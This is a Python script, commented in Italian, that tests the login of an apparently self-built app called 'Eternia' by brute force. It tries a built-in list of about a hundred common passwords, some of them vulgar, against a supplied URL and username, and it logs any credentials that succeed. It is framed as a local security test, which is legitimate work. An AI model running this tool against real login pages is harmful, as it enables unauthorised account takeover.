#!/usr/bin/env python3
"""
Brute Force Tester per Eternia Login
Questo script testa la sicurezza del login provando password comuni.
Usa con cautela, solo per test locali.
"""

import requests
import time
import sys
import logging
from concurrent.futures import ThreadPoolExecutor, as_completed

# Configurazione logging
logging.basicConfig(filename='brute_force_log.txt', level=logging.INFO,
                    format='%(asctime)s - %(levelname)s - %(message)s')

# Lista di password comuni per test (limitata per sicurezza)
COMMON_PASSWORDS = [
    'password', '123456', 'password123', 'admin', 'letmein', 'welcome',
    'monkey', '123456789', 'qwerty', 'abc123', 'password1', 'iloveyou',
    'princess', 'rockyou', '1234567', '12345678', 'trustno1', 'superman',
    'batman', 'password1234', 'qwerty123', '1q2w3e4r', 'baseball',
    'dragon', 'football', 'master', 'jordan', 'harley', 'ranger',
    'iowa', 'pepper', 'zaq1zaq1', 'starwars', 'startrek', 'scotty',
    'tiger', 'cameron', 'testing', '1qaz2wsx', 'login', 'passw0rd',
    'changeme', 'qwertyuiop', '123321', '1234567890', 'letmein123',
    'welcome123', 'admin123', 'root', 'toor', 'god', 'sex', 'god123',
    'pussy', '696969', 'mustang', 'shadow', 'michael', 'ninja', 'fuckyou',
    'jennifer', 'jordan23', 'killer', 'trustno1', 'joshua', 'pepper1',
    'zaq1zaq1', 'qazwsx', 'test123', 'test', 'guest', 'user', 'webmaster',
    'adminadmin', 'admin1', 'administrator', 'superuser', 'root123',
    'system', 'oracle', 'db2', 'informix', 'mysql', 'postgres', 'apache',
    'tomcat', 'websphere', 'weblogic', 'jboss', 'glassfish', 'coldfusion',
    'iis', 'exchange', 'sharepoint', 'sqlserver', 'oracle9i', 'oracle10g'
]

def try_login(url, username, password, session):
    """Prova un singolo tentativo di login"""
    try:
        data = {
            'username': username,
            'password': password,
            'timestamp': int(time.time() * 1000)  # Timestamp per anti-replay
        }
        response = session.post(url, data=data, timeout=10)
        
        logging.info(f'Tentativo: {username}:{password} - Status: {response.status_code}')
        
        if 'dashboard' in response.url or 'dashboard' in response.text:
            logging.warning(f'SUCCESSO! Login riuscito con {username}:{password}')
            return True, password
        elif 'Credenziali non valide' in response.text:
            logging.info(f'Fallito: {username}:{password}')
            return False, None
        else:
            logging.warning(f'Risposta inaspettata per {username}:{password}: {response.text[:200]}')
            return False, None
    except Exception as e:
        logging.error(f'Errore durante tentativo {username}:{password}: {str(e)}')
        return False, None

def brute_force(url, username, max_workers=2, delay=1):
    """Esegue brute force con thread limitati"""
    session = requests.Session()
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    })
    
    logging.info(f'Inizio brute force su {url} per utente {username}')
    
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = []
        for password in COMMON_PASSWORDS:
            futures.append(executor.submit(try_login, url, username, password, session))
            time.sleep(delay)  # Delay per evitare rate limiting troppo aggressivo
        
        for future in as_completed(futures):
            success, found_password = future.result()
            if success:
                logging.critical(f'PASSWORD TROVATA: {found_password} per {username}')
                return found_password
    
    logging.info('Brute force completato senza successo')
    return None

if __name__ == '__main__':
    if len(sys.argv) != 3:
        print("Uso: python brute_force_tester.py <url_login> <username>")
        print("Esempio: python brute_force_tester.py http://localhost:5000/login admin")
        sys.exit(1)
    
    url = sys.argv[1]
    username = sys.argv[2]
    
    print(f"Inizio test brute force su {url} per {username}")
    print("Controlla brute_force_log.txt per i dettagli")
    
    found = brute_force(url, username)
    
    if found:
        print(f"PASSWORD TROVATA: {found}")
    else:
        print("Nessuna password trovata nella lista")
